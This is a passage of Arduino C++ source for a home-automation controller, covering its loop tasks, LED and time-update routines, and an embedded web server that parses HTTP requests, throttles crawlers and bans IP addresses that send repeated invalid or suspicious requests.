     The buzzer can sound for up to twenty seconds - typically 15 seconds
  */

  //Internet connections use the hallway LED to signal processing - so suspend other processing
  if (!G_EthernetClientActive)
    SwitchOffLEDLights();  //General PIR, Bathroom, Hallway RGB LED (PIR activation signals and nightlight)
  //

#ifdef D_2WGApp
  if (G_GarageBuzzerTimer == 0) {
#endif

    //These tasks we process in every loop iteration
    WebServerProcess();         //Process html requests, send the pages responses
    ProcessPIRInterrupts();     //Action any PIR interrupts that have come in recently

    if (G_LoopCounter == 1) {
      //These tasks we process only once every 20 loops
#ifdef D_2WGApp
      BathroomProcess();          //Futures
      //AirPumpSwitching();         //If air pump enabled switch the pump on and off every minute
#endif
      CheckIfUDPNTPUpdateReqd();  //Forced manually off the SettingsWebPage (logged in)
      FiveMinuteCheck();          //Captures daily min & max AND checks heat resource availability
      ClimateProcess();           //Periodically and including midnight processing
      FireProcess();              //Check for over temperature movements
      ProcessAlarmTimerActions(); //

      SendTestEmail();            //Only if G_SendTestEmail is true
      CheckSocketConnections();   //Force disconnect ethernet sockets
      CheckForUPDNTPUpdate();     //At 6:27AM everyday
    } //These tasks we process only once every 20 loops

    //These tasks also processed in every loop iteration

    //If the cache has been moved to the CACHE.TXT file we do not process it
    //(would required two File objects) while an EthernetClient object exists.
    //Likewise, we do not create new EthernetClient objects if CACHE.TXT exists.
    boolean l_process_cache = false;
    if (!G_EthernetClientActive)
      l_process_cache = true;
    else {
      if (!CacheFileExists())
        l_process_cache = true;
      //
    }
    if (l_process_cache) {
      ProcessCache(true);         //Force clear before lots of SRAM changes can be written
      WriteSRAMAnalysisChgsSPICSC3(); //Write them to the activity file
      //This will cause the heap to rollback to NULL (or near NULL)
      ProcessCache(true);         //Force clear at end of loop
    }

#ifdef D_2WGApp
  } //Suspend operations so we can beep the garage buzzer in even one second intervals
#endif

#ifdef D_2WGApp
  //One minute checking of air pump operation
  if (CheckSecondsDelay(G_AirPumpTimer, C_OneMinute)) {
    HeatResourceCheck();
  }
#endif

  //With the cache now clear fragmentated free heap memory should be minimised
  int l_data_size;
  int l_free_ram;
  int l_stack_size;
  RamUsage(l_data_size, G_Loop_Heap_Size, l_free_ram, l_stack_size, G_Loop_Free_Heap_Size, NULL);
  AnalyseFreeHeap(G_Loop_Free_Heap_Size, G_Loop_Free_Heap_Count, NULL);

}//loop

//----------------------------------------------------------------------------------------

void SwitchOffLEDLights() {
  const byte c_proc_num = 103;
  Push(c_proc_num);

  //First check the general PIR LED
  if (G_PIRLEDTimer != 0) {
    if (CheckSecondsDelay(G_PIRLEDTimer, C_OneSecond * 30)) {
      digitalWrite(DC_PIRLedPin, LOW);
    }
  }

#ifdef D_2WGApp
  //Second check the Bathroom Light
  if (G_BathroomLightTimer != 0) {
    if (CheckSecondsDelay(G_BathroomLightTimer, C_OneMinute)) {
      digitalWrite(G_BathroomLightPin, HIGH); //Relay and its LED Off
    }
  }

  //Process any PIR activation LED signal and exit.
  //This overrides the night light operation.
  if (G_PIRLightTimer != 0) {
    if (CheckSecondsDelay(G_PIRLightTimer, C_OneSecond / 2)) {
      //PIR Light Timer has timed out - revert to the current nightlight state
      if (G_LEDNightLightTimer == 0)
        SetRGBLEDLightColour(0, 0, 0, true); //Nightlight not operating - leave off
      else
        SetRGBLEDLightColour(255, 255, 255, true); //Nightlight operating - leave on
      //
    }
    else {
      //This will be reset PIR signals if the LED has just signalled www activity
      SetRGBLEDLightColour(G_LED_Red, G_LED_Green, G_LED_Blue, true);
    }
    //We check for night light timeout in the next loop iteration
    CheckRAM();
    Pop(c_proc_num);
    return;
  }

  //If we get here we process G_LED_NightLightTimer which is used as a night light
  if (G_LEDNightLightTimer != 0) { //LED Nightlight is on
    if (CheckSecondsDelay(G_LEDNightLightTimer, C_OneSecond * 15)) { //15 seconds
      SetRGBLEDLightColour(0, 0, 0, true);
    }//Switch off after 15 seconds
    else
      //This will switch on (or reswitch on) the night light whose operation may have been
      //overriden by a PIR interrupt flash of the RGB LED.
      //When we initialise the night light timer we do not switch the night light on - it happens here.
      SetRGBLEDLightColour(255, 255, 255, true); //Switch nightlight on (applies where G_PIRLightTimer == 0
    //
  }
  else //Both light timers are zero - so force the light off after internet use)
    SetRGBLEDLightColour(0, 0, 0, true);
  //
#endif

  CheckRAM();
  Pop(c_proc_num);
} //SwitchOffLEDLights

//----------------------------------------------------------------------------------------

void CheckIfUDPNTPUpdateReqd() {
  //This proc processes an online request for an ad hoc UPDNTP update
  //The option is on the settings menu when the user is logged in
  const byte c_proc_num = 3;
  Push(c_proc_num);

  if (!G_UPDNTPUpdate) { //No action required
    Pop(c_proc_num);
    return;
  }

  //We don't update time while an ethernetclient is active
  if (G_EthernetClientActive) {
    Pop(c_proc_num);
    return;
  }

  //First we save the current memory data
  //If we have started without a correct datetime then this will save "somewhere" based on the incorrect date/time.
  MemoryBackup();

  //Now get the internet time.
  G_UDPNTPOK = ReadTimeUDP(); //Will error out if G_EthernetOk == false
  if (G_UDPNTPOK) ActivityWrite(EPSR(E_UDP_NTP_OK_18));
  else            ActivityWrite(Message(M_UDP_NTP_Failure_2)); //Can happen if returned packet not 48 bytes
  if (EPSR(E_Daylight_Saving_5) == C_T) SetDaylightSavingTime(true);
  else                                  SetDaylightSavingTime(false);

  if (G_UDPNTPOK) {
    //If the system originally restarted and did not get the correct date and time we may
    //now have the correct time and can now load the most recent and correct backup.
    LoadRecentMemoryBackupFile();
  }

  //We only try once regardless of failure.
  G_UPDNTPUpdate = false;
  CheckRAM();
  Pop(c_proc_num);
} //CheckIfUDPNTPUpdateReqd

//----------------------------------------------------------------------------------------

boolean SDFileDeleteSPICSC(const String &p_filename, String &p_msg) {
  const byte c_proc_num = 4;
  Push(c_proc_num);

  //We reinstate the previous SPI device
  int l_current_SPI_device = CurrentSPIDevice();
  SPIDeviceSelect(DC_SDCardSSPin);
  // Check to see if the file exists
  String l_filename = p_filename; //cannot be a const
  if (!SD.exists(&l_filename[0]) ) {
    p_msg = String(EPSR(E_File_Not_Found__110) + p_filename);
    SPIDeviceSelect(l_current_SPI_device);
    Pop(c_proc_num);
    return false;
  }

  CheckRAM();
  //Delete the file
  //Note: This does not work for long filenames
  SD.remove(&l_filename[0]);
  if (!SD.exists(&l_filename[0]))
    p_msg = String(Message(M_File_Deleted__10) + p_filename);
  else
    p_msg = String(Message(M_FILE_NOT_DELETED__11) + p_filename);
  //
  SPIDeviceSelect(l_current_SPI_device);
  Pop(c_proc_num);
} //SDFileDeleteSPICSC

//----------------------------------------------------------------------------------------
//WEB SERVER
//----------------------------------------------------------------------------------------

void WebServerProcess() {
  /*
    These procedures are concerned with receiving html requests from an end-user's web browser,
    parsing that request to extract the relevant information and then taking some action -
    typically calling a sub procedure to display a web page.
    By the very nature of the task this procedure is involved in significant amounts of string
    parsing - you need to be good at that to understand this code and implement your own
    equivalent procedure in your Arduino ethernet application.
    Note that within this application the great majority of the web site pages are referenced
    by integer numbers. I removed the alphabetic page names to reduce application usage of
    static SRAM caused by long string web page names.
    Note also that key information (parameters) within a user's html request is extracted to a linked list
    reference by the global pointer G_HTMLParmListHead. This implementation eliminates a substantial
    tranche of procedure parameter parsing because any html request information/parameters can be extracted
    anywhere within the application by a call to the procedure HTMLParmRead();
    At this time we record users host, cookie, password, SD Card Folder, Filenames and FileDelete request
    information in the linked list.

    We generally process/evaluate each html request from an end-user's browser in this order:
    1. First extract the URL request (begins with GET/POST/HEAD, ends with HTTP/X.X1)
    2. WebServerCheckHTML - Make sure we have a GET, HEAD or POST html request that is terminated by HTTP/X.X
      - URLs longer than 128 chars will error out (and be treated as a hack)
    3. Ignore additional ICON file requests from the most recent IP address (only serve two)
    4. WebServerCheckIfHacker - Ignore any requests from known hackers (six or more previous bad url requests)
    5. WebServerCheckValidRequest - Ignore proxy, php, chi, asp, xml, html requests (multiple requests caught previously as hackers)
    6. WebServerRequestEvaluate - Evaluate the request (first line) against known application requirements
    7. WebSvrStripHTMLReq - Strip remaining html request content down to the first blank line (or EOF)
      - Some key data is written to our HTML parm linked list (host & cookie)
      - Does not deal with form field data or multi-part (file upload) form data
    8. WebServerStripHTMLFormData - Strip form field data and add it to our HTML parm linked list (not multipart/file upload form data)
    9. WebServerRequestResolve - Check valid page number, loq the request, etc
      WebServerWebPage - Write the web page name into out log cache.
    10. WebServerCheckSecurity - Deals with entry and/or valid/invalid cookies
       - WebServerCheckPwd - Checks that a Password Input web page password is valid, creates cookie if OK
       - WebServerCheckACookie - Checks for a valid cookie (when no password supplied)
    11. ProcessCache (except for pages [5], [6] & [31]) - Write the cached html request etc to the appropriate log file.
    12. WebServerPageLaunch - Performs pre-processing (incl SD Card file deletes) and then sends the next web page back to the user's browser

    For pages [5], [6] & [31] the cache is processed (written to log file) after file authentication checks and before
    further processing.
  */

  //Example of an HTML web page request.
  //Yes, this is the sort of thing that this procedure receives and processes.

  //GET /2WG/ HTTP/1.1
  //Host: 192.168.2.80
  //User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0
  //Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  //Accept-Language: en-nz,th;q=0.5
  //Accept-Encoding: gzip, deflate
  //DNT: 1
  //Cookie: CWZSID=177728
  //Connection: keep-alive
  //\r\n <<BLANK LINE ENDS>>

  const byte c_proc_num = 5;
  Push(c_proc_num);

  //If we could not get an operating ethernet connection in the setup() procedure don't bother.
  if (!G_EthernetOK) {
    Pop(c_proc_num);
    return;
  }

  CheckRAM(); //G_EthernetClient may still be active and consuming RAM - how much is left?

  //To avoid terminating a client connection while transmission is incomplete
  //we use this global timer to allow communication of the previous html requests
  //web page result to complete while the processor is doing something else.
  //(Following will pass through if timer/EthernetClient is not active.)
  if (CheckSecondsDelay(G_EthernetClientTimer, C_OneSecond * 2) == false) {
    Pop(c_proc_num);
    return;
  }
  //We do not hang around waiting for another html request on the current connection.
  //If our previous response we sent Connection: Close anyway.
  //If an end-user wants to send another request their browser will have to open another socket connection.
  //Since we do not run multi-threaded socket connections forcing each connection closed and forcing
  //new socket connections for each html request provides the best multi-user operation.
  if (G_EthernetClientActive)
    EthernetClientStop(); //Discards the HTMLParmList (not the cache)
  //

  //We do not create new EthernetClient objects if CACHE.TXT exists.
  //Rather we exit to allow ProcessCache() to be invoked at the end of loop()
  if (CacheFileExists()) {
    Pop(c_proc_num);
    return;
  }
  SPIDeviceSelect(DC_EthernetSSPin);

  //Lets get the next connection (html request) if any are waiting.
  if (WebServerClientConnect()) {
    G_Hack_Flag         = false; //Redirects hack HTML data to the HACKLOGS
    G_XSS_Hack_Flag     = false; //We totally ignore XSS hackers
    G_Web_Crawler_Index = -1;    //Redirects web crawler HTML data to the crawler logs/Controls Baidu
    G_Mobile_Flag       = false; //Reformat web pages for smartphones
    G_CWZ_HTML_Req_Flag = false; //

    //Strip the first (URL) line of the html request
    String l_req_line = "";
    l_req_line.reserve(129);
    //We have already waited up to an initial half a second URL line data to arrive.
    //But we loop until we can get some URL line data - discard any initial blank line(s) (unexpected)
    //We expect something like "GET /12345/ HTTP/1.1"
    while (G_EthernetClient.available()) {
      //The html request URL is restricted to 128 chars
      l_req_line = ExtractECLineMax(128, false); //XSS transformation does not apply to the URL line
      l_req_line.trim();
      if (l_req_line != "")
        break; //We have the first non null line
      //
    }

    //Now check that we have some data.
    //If we got no data because the connection just sent some blank lines then
    //we ignore the connection - we do not even count it as a hack.
    if (l_req_line != "") {

      //Count the connection
      G_EthernetClient.getRemoteIP(G_RemoteIPAddress);
      if ((G_RemoteIPAddress[0] == 192) && (G_RemoteIPAddress[1] == 168))
        StatisticCount(St_LAN_Page_Connects, false); //don't exclude CWZ
      else
        StatisticCount(St_WWW_Page_Connects, false); //don't exclude CWZ
      //

      if (WebServerCheckHTML(l_req_line)) { //GET, POST or HEAD
        //l_req_line now contains the GET, POST or HEAD URL request
        //e.g. GET /favicon.ico HTTP/1.1

        //Discard excessive and browserconfig.xml requests
        boolean l_discard = false;

        //WE WANT TO IGNORE ADDITIONAL ICON FILE REQUESTS FROM THE SAME IP
        //Serial.println(l_req_line);
        if (l_req_line.indexOf(EPSR(E_icon_50)) != -1) {
          boolean l_same_ip = true;
          for (int l_index = 0; l_index < 4; l_index++) {
            if (G_Prev_ICON_Rip[l_index] != G_RemoteIPAddress[l_index]) {
              //Serial.println(l_prev_rip[l_index]);
              //Serial.println(l_rip[l_index]);
              l_same_ip = false;
              break;
            }
          }
          if (l_same_ip == true) {
            if (G_Prev_ICON_Rip_Count == 1)
              //We will fall though and process the second ICON file request
              G_Prev_ICON_Rip_Count++;
            else {
              StatisticCount(St_Discarded_ICON_Requests, true); //p_excl_catweazle
              l_discard = true;
            }
          } //Same IP
          else { //New IP
            //Save this new ICON address to prevent duplicates
            G_Prev_ICON_Rip_Count = 1;
            for (int l_idx = 0; l_idx < 4; l_idx++)
              G_Prev_ICON_Rip[l_idx] = G_RemoteIPAddress[l_idx];
            //
          } //Same of Changed IP
        } //Check ICON requests for multiples (ignore them)
        else { //check browserconfig.xml requests
          String l_line = l_req_line;
          l_line.toLowerCase();
          if (l_line.indexOf(EPSR(E_browserconfigdtxml_300)) != -1) {
            l_discard = true;
          }
          l_line.toUpperCase();
        } //ignore browserconfig.xml requests

        if (l_discard) {
          CheckRAM();
          EthernetClientStop(); //Discards the HTMLParmList (not the cache)
          Pop(c_proc_num);
          //return here so the blank separator line is not written
          return;
        }

        //Not an icon file to ignore
        //Not browserconfig.xlm
        //We will process this html request
        //So initialise the logging process
        //Header, IP, Ports, request line
        WriteInitialHTMLLogData(l_req_line);

        //We don't respond to hackers after five bad requests.
        //Each bad request will update their timer and delay their deletion from the hacker table.
        //Their IP address will not be ready to go until they are deleted from the hacker table.
        //Older and lower count hacks are deleted first.
        //If a hacker the WebServerCheckIfHacker() will close the connection after dumping the rest of the request
        if (!WebServerCheckIfHacker(false)) { //Don't exclude generic IP addresses at this time (Check again later after User-Agent extracted.)
          //For an invalid request WebServerCheckValidRequest() will close the connection after dumping the rest of the request
          if (WebServerCheckValidRequest(l_req_line)) { //Ignore proxy and php and other invalid request types

            //Now strip the web page number, file or folder(dir) name, delete flag
            //The names of the file for directory (folder) to display (delete)
            //Should start with a slash.
            //If a directory (folder) will also end with a slash.
            String l_file_or_dir = ""; //Has a leading slash

            unsigned int l_page_number = 0;
            WebServerRequestEvaluate(l_page_number, l_req_line, l_file_or_dir);
            //From this point we assume a reasonably valid html request
            //so we commence writing to the html request log file (Cached)
            //Any page number errors are also written to the hack log and identified later

            //Now strip the html request of the field information we need to know.
            //This will generate say up to 20 cached records.
            //We expect to extract host and cookie values.
            //We may extract content length and a multi-part form boundary.
            //Our HTML cache log will be written to disk is RAM runs low
            //because the html request contains a lot of data.
            //Form and multi-part form data (that comes after a blank line)
            //will be processed later.

            //We allow up to two seconds for all html request field data to arrive.
            //They might be coming across the world and a large html request may be
            //broken into multiple packets. We know that the W5100 chip processes
            //a packet AND then sends a handshake to allow the next packet to arrive.
            boolean l_finished = false;
            G_DownThemAll_Flag = false;
            G_EthernetClientTimer = millis(); //Start the timer
            while (CheckSecondsDelay(G_EthernetClientTimer, C_OneSecond * 2) == false) {
              while (G_EthernetClient.available()) {
                //We read all the html request data until we encounter a blank line (or null line/EOF)
                //This includes processing the User-Agent string to identify web crawlers, mobile browsers and script hacks
                l_finished = WebSvrStripHTMLReq(l_page_number);
                //WebSvrStripHTMLReq and its decendants do a fair bit of string processing
                //So it is worth optimising the heap after the local Strings have been released
                //and a few HTMLParm records have been created.
                if (l_finished)
                  break;
                //
                //Any form or multipart form (file upload) data has not been processed
              }
              if (l_finished)
                break;
              //
            } //Max two second delay for all html request fields to arrive and be processed

            //Check for crawler activity from known IP addresses that do not identify themselves as crawlers
            boolean l_crawler_ip_found = false;
            int l_crawler;
            for (l_crawler = 0; l_crawler < G_CrawlerIPCount; l_crawler++) {
              String l_ip = G_EthernetClient.getRemoteIPString();
              if (l_ip.indexOf(G_WebCrawlerIPs[l_crawler]) == 0) {
                l_crawler_ip_found = true;
                break;
              }
            }
            if (l_crawler_ip_found) {
              for (int l_crwl_index = 0; l_crwl_index < G_CrawlerCount; l_crwl_index++) {
                if (G_WebCrawlers[l_crwl_index].indexOf(G_WebCrawlerIPNames[l_crawler]) == 0) {
                  if (G_Web_Crawler_Index == -1) { //Only count once for each html request
                    G_StatCrwlMth[l_crwl_index]++;
                    G_StatCrwlDay[l_crwl_index]++;
                    HTMLParmInsert(E_CRAWLER_298, G_WebCrawlerIPNames[l_crawler]);
                  }
                  G_Web_Crawler_Index = l_crwl_index;
                  break;
                }
              }
            }

            //Randomly ignore excessive Crawler request
            //See code below for the algorithm
            boolean l_crawl_ignore = false;
            if (G_Web_Crawler_Index != -1) {
              int l_dd, l_mm, l_yyyy, l_hh, l_min = 0;
              TimeDecode(Now(), &l_hh, &l_min);
              if (l_hh >= 6) {
                DateDecode(Date(), &l_dd, &l_mm, &l_yyyy);
                int l_avg = G_StatCrwlMth[G_Web_Crawler_Index] / l_dd;
                //Serial.print(l_avg);
                if ((l_avg > 30) &&                               //if > 30 avg and > 20 today we give them one in ten
                    (G_StatCrwlDay[G_Web_Crawler_Index] > 20)) {  //Will impact Baidu, Bing and Google
                  if (random(10) != 0) {
                    HTMLWrite("- " + EPSR(E_SUPPRESSION_314) + ": TRUE");
                    l_crawl_ignore = true;
                  }
                  else {
                    HTMLWrite("- " + EPSR(E_SUPPRESSION_314) + ": FALSE");
                  }
                } //Greater than 30 per day
              } //Allow all crawler requests before 6:00AM
            } //Check excessive crawler requests

            if (l_crawl_ignore) {
              EthernetClientStop(); //Discards the HTMLParmList (not the cache)
            }
            else if (G_DownThemAll_Flag) {
              //We just ignore the use of the DownThemAll Appln
              G_Hack_Flag = true;
              EthernetClientStop(); //Discards the HTMLParmList (not the cache)
            }
            //If the html request wait period timed out we may not have received all the data we
            //require and may be in an inconsistent state.
            else if (!l_finished) {
              SendHTMLError(EPSR(E_400_Bad_Request_219), Message(M_Partial_HTML_Request_Received_and_Ignored_38));
              EthernetClientStop(); //Discards the HTMLParmList (not the cache)
            }
            else if (G_XSS_Hack_Flag) {
              //User Agent or From field contains a cross site script hack attempt
              //This only applies to 1st, 2nd, 3rd, 4th and 5th html requests
              //All others are trapped by WebServerCheckIfHacker
              //We dont send any html response
              ProcessHackAttempt(EPSR(E_PROHIBITED_REQUEST_224), "XSS", St_Other_Hacks); //Considered a hacker
            }
            else if (HTMLParmRead(E_HOST_230) == "") {
              //Host is a required html request field
              ProcessHackAttempt(EPSR(E_PROHIBITED_REQUEST_224), "HST", St_Other_Hacks); //Considered a hacker
            }
            else {
              //If not a multi-part form for a file upload then strip remaining form field data
              //to out html parms linked list.
              if ((l_req_line.substring(0, 4) == EPSR(E_POST_47)) &&
                  (l_page_number != G_PageNames[44])) { //Multipart form file upload processing is dealt with elsewhere
                //Just in case we allow another half second for data to arrive from across the world.
                //This might be neccesasy where the overall content of the html request uses multiple data blocks.
                G_EthernetClientTimer = millis(); //Start the timer
                while (CheckSecondsDelay(G_EthernetClientTimer, C_OneSecond / 2) == false) {
                  //If we have any waiting data in the socket we assume it is the full POST form field data.
                  if (G_EthernetClient.available()) {
                    WebServerStripHTMLFormData(l_page_number);
                    break;
                  }
                }
                //We don't error out if we have a POST form but do not receive any POST field data
                //That could be a normal situation - null value fields may not be in the field data.
              }
              //We now have all our form data (from POST html requests) loaded into our linked list
              //We ignored extraneous (bogus) and very long fields in the form data stream
              //File upload (multipart form) data associated with this html request remains unprocessed

              //Now we ignore generic IP addresses that are not crawlers
              if ((G_Web_Crawler_Index != -1) || (!WebServerCheckIfHacker(true))) {
                //Check all of the html parameters etc
                //This procedure will identify any invalid requests which resolve to l_page_number = 0
                //This procedure also dumps the HTML Parm List to the HTML Log File
                if (WebServerRequestResolve(l_page_number, l_req_line, l_file_or_dir)) {
                  HTMLWrite(EPSR(E_hy_PAGEco__255) + WebServerWebPage(l_page_number));
                  WebServerCheckSecurity(l_page_number, l_req_line); //Chk pwd or cookie
                  //Under these circumstances we may possibly switch the G_Hack_Flag
                  //so we need to retain the html log cache.
                  //For other pages we can clear the cache now.
                  if ((l_page_number != G_PageNames[5])  && //FOLDER BROWSE
                      (l_page_number != G_PageNames[6])  && //FILE DISPLAY
                      (l_page_number != G_PageNames[31]))   //FILE DUMP
                    ProcessCache(true); //Force clear
                  //
                  //Pages 5, 6 & 31 will force clear the cache before processing
                  //but after hacker (invalid file operation) cross checking is complete

                  WebServerPageLaunch(l_page_number, l_file_or_dir);
                } //WebServerRequestResolve
              }  //WebServerCheckIfHacker (Incl Generic)
            } //We skip further processing if the html request not fully received or a HOST field is not found
          } //WebServerCheckValidRequest
        } //WebServerCheckIfHacker (Non Generic)
      } //WebServerCheckHTML
    } //Ignore NULL connections
  } //WebServerClientConnect

  //When there is no activity going on there will be no cache or parm list to be cleared
  //Force the cache clear if we did not do it above.
  ProcessCache(true);
  //Dispose of the HTML parameter/information linked list (if any)

  CheckRAM();
  Pop(c_proc_num);
} //WebServerProcess

//----------------------------------------------------------------------------------------

boolean WebServerClientConnect() {
  //We only do internet processing after the previous ethernetclient has had two seconds to clear the buffer
  //We always close ethernet connections after each request is processed.
  //Our process is not multi-threaded so we cannot expect to hold
  //connections open waiting for additional html requests because that would
  //deny access to the system from other users comming in on other sockets.
  //For additional html requests the user's browser will have to establish a new socket connection.

  const byte c_proc_num = 6;
  Push(c_proc_num);

  //Look for a new client connection/request - return if no web server client found
  //Note: This will not return connections that have sent no data
  //      They will be disconnected automatically after two minutes
  //This will favour local IP html requests before external www requests.
  G_EthernetClient = G_EthernetServer.available();
  if (!G_EthernetClient) {
    Pop(c_proc_num);
    return false;
  }
  //If there is no active connection we returned above.
  G_EthernetClientActive = true;
  //We will use a time control processing of the connection including a
  //final two seconds for response transmission.

  //Turn on LED to indicate internet processing
  SetRGBLEDLightColour(0, 255, 255, false); //Green and blue makes aqua

  //Discard and return if the client connection is lost
  if (!G_EthernetClient.connected()) {
    EthernetClientStop(); //Discards the HTMLParmList (not the cache)
    Pop(c_proc_num);
    return false;
  }

  int l_bytes_avail = G_EthernetClient.available();
  G_EthernetClientTimer = millis();
  //We only wait half a second for the URL line to arrive.
  //We make the call to extract the URL line shortly in the calling proc
  G_EthernetClient.setTimeout(C_HalfSecond); //Default is one second
  //Use a loop to wait up to half a second OR until there are no more incoming
  //bytes which will indicate that we have the complete html request.
  while ((G_EthernetClient.available() != l_bytes_avail) ||
         (CheckSecondsDelay(G_EthernetClientTimer, C_HalfSecond) == false)) {
    l_bytes_avail = G_EthernetClient.available();
    delay(C_OneSecond / 10);
  }
  //Hopefully we now have all or enough of the html request input to extrac the first URL line
  CheckRAM();
  Pop(c_proc_num);
  return true;
} //WebServerClientConnect


//----------------------------------------------------------------------------------------

boolean WebServerCheckIfHacker(boolean p_check_generic_ip) {
  //More than five recent failures and the IP address is banned
  //(Even for subsequent valid html page requests)
  //However if our banned IP address is generic (last IP address value zero) we allow
  //requests from known web crawlers. (May subsequently error out if the html request is invalid.)
  const byte c_proc_num = 69;
  Push(c_proc_num);
  CheckRAM();

  //Parse the hacker list to see if this IP address can be found there
  byte l_ip = -1;
  boolean l_found = false; //D
  for (byte l_index = 0; l_index < DC_FailedHTMLRequestListCount; l_index++) {
    if ((p_check_generic_ip) || (G_FailedHTMLRequestList[l_index].IPAddress[DC_IPAddressFieldCount - 1] != 0)) {
      //look for an IP address match
      l_found = true;
      for (byte l_idx = 0; l_idx < DC_IPAddressFieldCount; l_idx++) {
        if ((G_FailedHTMLRequestList[l_index].IPAddress[l_idx] != G_RemoteIPAddress[l_idx]) &&
            ((l_idx < (DC_IPAddressFieldCount - 1)) ||
             //Is zero a valid IP address field value - this code assumes not
             (G_FailedHTMLRequestList[l_index].IPAddress[l_idx] != 0))) {
          l_found = false;
          break;
        }
      }
      if (l_found) {
        l_ip = l_index;
        break;
      }
    } //See if generic IP address checking applies
  } //Check each record of the hacker table

  //This IP address has no current hack record
  if (!l_found) {
    Pop(c_proc_num);
    return false;
  }

  //Otherwise for less than six previous hacks we allow processing
  //XSS hacks will be rejected when the UserAgent and From fields are checked
  if (G_FailedHTMLRequestList[l_ip].AttemptCount < 6) {
    Pop(c_proc_num);
    return false;
  }

  //If it is a hacker with six or more recognised hacks update the count every time
  // - even for a valid html request - they need to go away for a while
  if (G_FailedHTMLRequestList[l_ip].AttemptCount == 255)
    G_FailedHTMLRequestList[l_ip].AttemptCount = 3; //byte rollover to three
  else
    G_FailedHTMLRequestList[l_ip].AttemptCount++;
  //
  G_FailedHTMLRequestList[l_ip].LastDateTime = Now();  //resets the timer (delays record delete)

  DumpHTMLRequest(); //Dump remaining html request to the log files
  ProcessHackAttempt(EPSR(E_IP_ADDRESS_BANNED_227), "", //No need to update banned ip address table
                     St_Banned_IP_Addr_Refusals); //Incl Ethernetclient.Stop()

  CheckRAM();
  Pop(c_proc_num);
  return true;
} //WebServerCheckIfHacker


//----------------------------------------------------------------------------------------

boolean WebServerCheckHTML(const String &p_req_line) {
  //We make sure that the first line of our html request starts with GET or POST
  //and it ends with HTTP/X.X
  const byte c_proc_num = 67;
  Push(c_proc_num);
  CheckRAM();

  boolean l_result = true;

  //p_req_line will be like this when calling the dashboard "GET /XXX/ HTTP/1.1"
  String l_req_line_upper = p_req_line;
  l_req_line_upper.toUpperCase();
  //Check we are GET, POST and have HTTP
  if (((l_req_line_upper.substring(0, 3) != EPSR(E_GET_46)) &&
       (l_req_line_upper.substring(0, 4) != EPSR(E_POST_47)) &&
       (l_req_line_upper.substring(0, 4) != EPSR(E_HEAD_315))) ||
      (l_req_line_upper.indexOf(EPSR(E_HTTP_48)) == -1)) {
    //If the request is not a GET or POST with "HTTP" on the end
    //it is invalid and we ignore it.
    //Because our line is limited to 128 chars then the "HTTP" on the end
    //will be missing for very long URL requests (they will be hackers)

    //Is the request non ASCII?
    String l_ban_type = "URL";
    for (int l_index = 0; l_index < l_req_line_upper.length(); l_index++) {
      if ( ((l_req_line_upper[l_index] < 32) ||
            (l_req_line_upper[l_index] > 126)) &&
           (l_req_line_upper[l_index] != 9)    &&
           (l_req_line_upper[l_index] != 10)   &&
           (l_req_line_upper[l_index] != 13)      ) {
        l_ban_type = "BIN";
        break;
      }
      if (l_index == 5)
        break;
      //
    }

    WriteInitialHTMLLogData(p_req_line);
    DumpHTMLRequest();
    ProcessHackAttempt(EPSR(E_BAD_HTML_REQUEST_221), l_ban_type, St_Other_Hacks); //Considered a hacker

    l_result = false;
  }

  CheckRAM();
  Pop(c_proc_num);
  return l_result;
} //WebServerCheckHTML

//----------------------------------------------------------------------------------------

boolean WebServerCheckValidRequest(const String &p_req_line) {
  //We will ignore http (proxy), php and other unsupported URL requests
  const byte c_proc_num = 68;
  Push(c_proc_num);

  //Serial.println(p_req_line);
  String l_req_line = p_req_line;
  l_req_line.toLowerCase();

  //Ignore open proxy requests
  if (l_req_line.indexOf("http:") != -1) {
    DumpHTMLRequest(); //Dump remaining html request to the log files
    ProcessHackAttempt(EPSR(E_PROHIBITED_REQUEST_224), "PXY", St_Proxy_Hacks); //Considered a hacker
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }

  //Ignore CGI, ASP, HTM, PHP requests - we do not use these common technologies
  String l_ban_type = "";
  boolean l_result = true; //D
  if (l_req_line.indexOf("cgi") != -1)
    l_ban_type = "CGI";
  else if (l_req_line.indexOf("asp") != -1)
    l_ban_type = "ASP";
  else if (l_req_line.indexOf(".htm") != -1)
    l_ban_type = "HTM";
  else if (l_req_line.indexOf("php") != -1)
    l_ban_type = "PHP";
  else if (l_req_line.indexOf("xml") != -1)
    l_ban_type = "XML";
  else if (l_req_line.indexOf("ckedit") != -1)
    l_ban_type = "CKE";
  //

  if (l_ban_type != "") {
    DumpHTMLRequest(); //Dump remaining html request to the log files
    if (G_XSS_Hack_Flag)
      l_ban_type = "XSS"; //Ignore the invalid req_line/URL ban_type - this is an XSS hack
    //
    ProcessHackAttempt(EPSR(E_PROHIBITED_REQUEST_224), l_ban_type, St_Web_Page_Extension_Hacks); //Considered a hacker
    l_result = false;
  }

  CheckRAM();
  Pop(c_proc_num);
  return l_result;
} //WebServerCheckValidRequest

//----------------------------------------------------------------------------------------

void WebServerRequestEvaluate(unsigned int &p_page_number, const String &p_req_line, String &p_file_or_dir) {
  const byte c_proc_num = 66;
  Push(c_proc_num);

  //p_req_line is the original URL including the GET/POST/HEAD and HTTP/1.1
  //We may convert it to one of our two ICON files
  //The CWZL startup string will be converted to the dashboard startup string
  //The request may or may not have leading and/or trailing slashes
  //We strip page numbers from this variable if the request is not for:
  //- a file
  //- a folder
  //- or a known local command such as ALARMON
  //We remap old ".DIR" folder name requests
  String l_request_str = "";

  String l_req_line = p_req_line;
  l_req_line.toLowerCase();

  //Resolve all ICON requests to our standard icons
  if (l_req_line.indexOf(EPSR(E_icon_50)) != -1) {
    //We may trim the leading and trailing slashes later
    if ((G_RemoteIPAddress[0] == 192) && (G_RemoteIPAddress[1] == 168))
      l_request_str = EPSR(E_slIMAGESslLOC_ICONdtPNGsl_249); // /IMAGES/LOC_ICON.PNG
    else
      l_request_str = EPSR(E_slIMAGESslWWW_ICONdtPNG_251);   // /IMAGES/WWW_ICON.PNG
    //
  }
  else {
    l_req_line.toUpperCase();
    if (l_req_line.substring(0, 4) == EPSR(E_HEAD_315))
      HTMLParmInsert(E_HEAD_315, "T");
    //

    //Trim the HTML request e.g. GET /xxxxx/ HTTP/1.1
    //Note we process the request in uppercase.
    //We should be left with the requested page name (number).
    //Note that this code does not anticipate and process parameters on the first line
    //of any html GET request. If you need that you will need to do more code development.
    //This application does process input values from POST html requests that manifest as
